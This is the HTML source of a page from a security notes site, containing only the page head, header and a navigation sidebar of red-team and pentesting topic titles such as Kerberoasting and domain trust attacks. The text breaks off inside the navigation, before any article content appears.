<!DOCTYPE html>
<html class="no-js" lang="en"> <head><meta charset="utf-8"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta content="Think Red, Act Blue" name="description"/><meta content="neutron" name="author"/><link href="https://neutronsec.com/active_directory/stacking_the_deck/miscellaneous_misconfigurations/" rel="canonical"/><link href="../../../assets/favicon.png" rel="icon"/><meta content="mkdocs-1.3.1, mkdocs-material-8.4.4+insiders-4.23.1" name="generator"/><title>Misconfigurations - neutronsec</title><link href="../../../assets/stylesheets/main.6148a559.min.css" rel="stylesheet"/><link href="../../../assets/stylesheets/palette.cbb835fc.min.css" rel="stylesheet"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/><style>:root{--md-text-font:"Inter";--md-code-font:"Roboto Mono"}</style><link href="../../../stylesheets/extra.css" rel="stylesheet"/><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>html.glightbox-open { overflow: initial; height: 100%; }</style><script src="../../../assets/javascripts/glightbox.min.js"></script></head> <body data-md-color-accent="" data-md-color-primary="" data-md-color-scheme="" dir="ltr"> <input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/> <input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/> <label class="md-overlay" for="__drawer"></label> <div data-md-component="skip"> </div> <div data-md-component="announce"> </div> <header class="md-header" data-md-component="header"> <nav aria-label="Header" class="md-header__inner md-grid"> <a aria-label="neutronsec" class="md-header__button md-logo" data-md-component="logo" href="../../.." title="neutronsec"> <img alt="logo" src="../../../assets/images/illustration.png"/> </a> <label class="md-header__button md-icon" for="__drawer"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg> </label> <div class="md-header__title" data-md-component="header-title"> <div class="md-header__ellipsis"> <div class="md-header__topic"> <span class="md-ellipsis"> neutronsec </span> </div> <div class="md-header__topic" data-md-component="header-topic"> <span class="md-ellipsis"> Misconfigurations </span> </div> </div> </div> <form class="md-header__option" data-md-component="palette"> <input aria-label="Switch to light mode" class="md-option" data-md-color-accent="" data-md-color-media="(prefers-color-scheme)" data-md-color-primary="" data-md-color-scheme="" id="__palette_0" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"></path></svg> </label> <input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="indigo" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"></path></svg> </label> <input aria-label="Switch to system preference" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="indigo" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to system preference"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"></path></svg> </label> </form> <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg> </label> <div class="md-search" data-md-component="search" role="dialog"> <label class="md-search__overlay" for="__search"></label> <div class="md-search__inner" role="search"> <form class="md-search__form" name="search"> <input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/> <label class="md-search__icon md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg> </label> <nav aria-label="Search" class="md-search__options"> <a aria-label="Share" class="md-search__icon md-icon" data-clipboard="" data-clipboard-text="" data-md-component="search-share" href="javascript:void(0)" tabindex="-1" title="Share"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"></path></svg> </a> <button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg> </button> </nav> <div class="md-search__suggest" data-md-component="search-suggest"></div> </form> <div class="md-search__output"> <div class="md-search__scrollwrap" data-md-scrollfix=""> <div class="md-search-result" data-md-component="search-result"> <div class="md-search-result__meta"> Initializing search </div> <ol class="md-search-result__list"></ol> </div> </div> </div> </div> </div> </nav> </header> <div class="md-container" data-md-component="container"> <nav aria-label="Tabs" class="md-tabs" data-md-component="tabs"> <div class="md-tabs__inner md-grid"> <ul class="md-tabs__list"> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../.."> Home </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../../about/"> About </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../../blog/"> Blog </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link md-tabs__link--active" href="../../../docs/"> Notes </a> </li> </ul> </div> </nav> <main class="md-main" data-md-component="main"> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0"> <label class="md-nav__title" for="__drawer"> <a aria-label="neutronsec" class="md-nav__button md-logo" data-md-component="logo" href="../../.." title="neutronsec"> <img alt="logo" src="../../../assets/images/illustration.png"/> </a> neutronsec </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../.."> <span class="md-ellipsis"> Home </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../about/"> <span class="md-ellipsis"> About </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" id="__nav_3" type="checkbox"/> <div class="md-nav__link md-nav__container"> <a class="md-nav__link" href="../../../blog/"> <span class="md-ellipsis"> Blog </span> </a> <label class="md-nav__link" for="__nav_3"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav aria-label="Blog" class="md-nav" data-md-level="1"> <label class="md-nav__title" for="__nav_3"> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" id="__nav_3_2" type="checkbox"/> <label class="md-nav__link" for="__nav_3_2"> <span class="md-ellipsis"> Archive </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Archive" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_3_2"> <span class="md-nav__icon md-icon"></span> Archive </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/archive/2022/"> <span class="md-ellipsis"> 2022 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" id="__nav_3_3" type="checkbox"/> <label class="md-nav__link" for="__nav_3_3"> <span class="md-ellipsis"> Categories </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Categories" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_3_3"> <span class="md-nav__icon md-icon"></span> Categories </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/blog/"> <span class="md-ellipsis"> Blog </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/blue-team/"> <span class="md-ellipsis"> Blue Team </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/hackthebox/"> <span class="md-ellipsis"> HackTheBox </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/powershell/"> <span class="md-ellipsis"> Powershell </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/soc/"> <span class="md-ellipsis"> SOC </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" id="__nav_4" type="checkbox"/> <div class="md-nav__link md-nav__container"> <a class="md-nav__link" href="../../../docs/"> <span class="md-ellipsis"> Notes </span> </a> <label class="md-nav__link" for="__nav_4"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav aria-label="Notes" class="md-nav" data-md-level="1"> <label class="md-nav__title" for="__nav_4"> <span class="md-nav__icon md-icon"></span> Notes </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" id="__nav_4_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2"> <span class="md-ellipsis"> Cheatsheets </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cheatsheets" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_2"> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1" id="__nav_4_2_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1"> <span class="md-ellipsis"> Pentesting / CTF </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Pentesting / CTF" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_2_1"> <span class="md-nav__icon md-icon"></span> Pentesting / CTF </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1_1" id="__nav_4_2_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1_1"> <span class="md-ellipsis"> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Directory" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_2_1_1"> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/active_directory/cheatsheet_aid/"> <span class="md-ellipsis"> Basics </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/active_directory/enumeration_and_attacks/"> <span class="md-ellipsis"> Enumeration/Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/active_directory/exploitation/"> <span class="md-ellipsis"> Exploitation </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1_2" id="__nav_4_2_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1_2"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_2_1_2"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/privesc/linux/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/privesc/windows/"> <span class="md-ellipsis"> Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/cheatsheet-77/"> <span class="md-ellipsis"> Commands </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/linux_shortcuts/"> <span class="md-ellipsis"> Linux Shortcuts </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/windows/"> <span class="md-ellipsis"> Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/shells_payloads/"> <span class="md-ellipsis"> Shells &amp; Payloads </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/web_requests/"> <span class="md-ellipsis"> Web requests </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/deobfuscation/"> <span class="md-ellipsis"> (De)Obfuscation </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/brute_forcing/"> <span class="md-ellipsis"> Brute Forcing </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/common_apps/"> <span class="md-ellipsis"> Common Applications </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/web_attacks/"> <span class="md-ellipsis"> Web Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/file_transfer/"> <span class="md-ellipsis"> File Transfer </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/footprinting/"> <span class="md-ellipsis"> Footprinting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/cheatsheet_ptpf/"> <span class="md-ellipsis"> Pivoting, Tunnel, Port Forwarding </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/info_gathering_web/"> <span class="md-ellipsis"> Information Gathering - Web </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/msf/"> <span class="md-ellipsis"> MSF </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/password_attacks/"> <span class="md-ellipsis"> Password Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/attacking_common_services/"> <span class="md-ellipsis"> Attacking Common Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/ffuf/"> <span class="md-ellipsis"> FFUF </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/hydra/"> <span class="md-ellipsis"> Hydra </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../cheat_sheets/network_traffic_analysis/"> <span class="md-ellipsis"> Network Traffic Analysis </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" id="__nav_4_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3"> <span class="md-ellipsis"> Red Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Red Team" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_3"> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1" id="__nav_4_3_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1"> <span class="md-ellipsis"> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Directory" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_1"> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_1" id="__nav_4_3_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_1"> <span class="md-ellipsis"> Initial Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Initial Enumeration" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_1"> <span class="md-nav__icon md-icon"></span> Initial Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../initial_enum/external_recon_enum_principles/"> <span class="md-ellipsis"> External Recon </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../initial_enum/init_enum_domain/"> <span class="md-ellipsis"> Initial Enumeration of the Domain </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_2" id="__nav_4_3_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_2"> <span class="md-ellipsis"> Gaining a Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Gaining a Foothold" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_2"> <span class="md-nav__icon md-icon"></span> Gaining a Foothold </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../foothold/llmnr_nbtns_poisonong_from_linux/"> <span class="md-ellipsis"> LLMNR/NBT-NS Poisoning - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../foothold/llmnr_nbtns_poisonong_from_windows/"> <span class="md-ellipsis"> LLMNR/NBT-NS Poisoning - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_3" id="__nav_4_3_1_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_3"> <span class="md-ellipsis"> Hunting for a User </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Hunting for a User" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_3"> <span class="md-nav__icon md-icon"></span> Hunting for a User </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../userhunting/enumerate_retrieve_pwdpol/"> <span class="md-ellipsis"> Enumerating &amp; Retrieving PwdPols </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../userhunting/pwd_spraying_target_user_list/"> <span class="md-ellipsis"> Pwd Spraying - Making a Targeted User List </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_4" id="__nav_4_3_1_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_4"> <span class="md-ellipsis"> PwSpray </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="PwSpray" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_4"> <span class="md-nav__icon md-icon"></span> PwSpray </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../spray_responsibility/internal_pwd_spray_from_linux/"> <span class="md-ellipsis"> Internal Spraying - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../spray_responsibility/internal_pwd_spray_from_windows/"> <span class="md-ellipsis"> Internal Spraying - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_5" id="__nav_4_3_1_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_5"> <span class="md-ellipsis"> Post Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Post Foothold" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_5"> <span class="md-nav__icon md-icon"></span> Post Foothold </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../deeper_down_the_rabbithole/enumerating_security_controls/"> <span class="md-ellipsis"> Enumerating Security Controls </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../deeper_down_the_rabbithole/credentialed_enumeration_from_linux/"> <span class="md-ellipsis"> Credentialed Enumeration - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../deeper_down_the_rabbithole/credentialed_enumeration_from_windows/"> <span class="md-ellipsis"> Credentialed Enumeration - Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../deeper_down_the_rabbithole/living_off_the_land/"> <span class="md-ellipsis"> Living Off The Land </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_6" id="__nav_4_3_1_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_6"> <span class="md-ellipsis"> Kerberoasting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Kerberoasting" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_6"> <span class="md-nav__icon md-icon"></span> Kerberoasting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../cooking_with_fire/kerberoasting_from_linux/"> <span class="md-ellipsis"> Kerberoasting - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cooking_with_fire/kerberoasting_from_windows/"> <span class="md-ellipsis"> Kerberoasting - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_7" id="__nav_4_3_1_7" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_7"> <span class="md-ellipsis"> ACLs </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="ACLs" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_7"> <span class="md-nav__icon md-icon"></span> ACLs </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../acls/acl_enumeration/"> <span class="md-ellipsis"> ACL Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../acls/acl_abuse/"> <span class="md-ellipsis"> ACL Abuse Tactics </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../acls/dcsync/"> <span class="md-ellipsis"> DCSync </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_8" id="__nav_4_3_1_8" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_8"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_8"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../privileged_access/"> <span class="md-ellipsis"> Privileged Access </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../kerberos_double_hop/"> <span class="md-ellipsis"> Kerberos Double Hop </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../bleeding_edge_vulns/"> <span class="md-ellipsis"> Vulnerabilities </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle="toc" id="__toc" type="checkbox"/> <a class="md-nav__link md-nav__link--active" href="./"> <span class="md-ellipsis"> Misconfigurations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_9" id="__nav_4_3_1_9" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_9"> <span class="md-ellipsis"> Domain Trusts </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Domain Trusts" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_9"> <span class="md-nav__icon md-icon"></span> Domain Trusts </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../why_so_trusting/domain_trusts_primer/"> <span class="md-ellipsis"> Domain Trusts Primer </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../why_so_trusting/atk_dom_trust_child_parent_trust_from_win/"> <span class="md-ellipsis"> Attacking Domain Trusts - Child -&gt; Parent - from Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../why_so_trusting/atk_dom_trust_child_parent_trust_from_linux/"> <span class="md-ellipsis"> Attacking Domain Trusts - Child -&gt; Parent - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_10" id="__nav_4_3_1_10" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_10"> <span class="md-ellipsis"> Cross-Forest Trust Abuse </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cross-Forest Trust Abuse" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_10"> <span class="md-nav__icon md-icon"></span> Cross-Forest Trust Abuse </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../cross_forest_trust/cross_forest_trust_abuse_from_win/"> <span class="md-ellipsis"> Cross-Forest Trust Abuse - from Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cross_forest_trust/cross_forest_trust_abuse_from_linux/"> <span class="md-ellipsis"> Cross-Forest Trust Abuse - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_11" id="__nav_4_3_1_11" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_11"> <span class="md-ellipsis"> Defensive Considerations </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Defensive Considerations" class="md-nav" 